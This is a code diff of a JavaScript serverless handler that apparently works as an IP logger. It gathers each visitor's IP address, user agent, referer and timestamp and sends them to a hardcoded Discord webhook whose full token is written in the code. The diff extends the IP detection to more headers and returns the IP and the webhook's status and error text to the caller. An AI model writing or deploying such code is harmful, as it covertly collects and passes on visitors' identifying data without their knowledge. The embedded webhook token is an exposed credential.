@@ -1,7 +1,7 @@
 export default async function handler(req, res) {
     const webhookURL = "https://discord.com/api/webhooks/1521243716113924302/WOcvtUZK5Out_9K3H9JKdoaexW9khoZ62TOLNFNXDSESZ2rMNQ8KuVy31zWQ1gBNZiz2";
     
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const referer = req.headers['referer'] || 'Direct';
     const timestamp = new Date().toISOString();
@@ -20,16 +20,28 @@ export default async function handler(req, res) {
     
     const payload = { embeds: [embed] };
     
+    let webhookStatus = 'not_sent';
+    let webhookError = null;
+    
     try {
-        await fetch(webhookURL, {
+        const response = await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+        webhookStatus = response.status;
+        const responseBody = await response.text();
+        webhookError = responseBody;
     } catch (e) {
-        console.error('Webhook error:', e);
+        webhookStatus = 'error';
+        webhookError = e.message;
     }
     
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.status(200).json({ ok: true });
+    res.status(200).json({ 
+        ok: true, 
+        ip: ip,
+        webhookStatus: webhookStatus,
+        webhookError: webhookError
+    });
 }
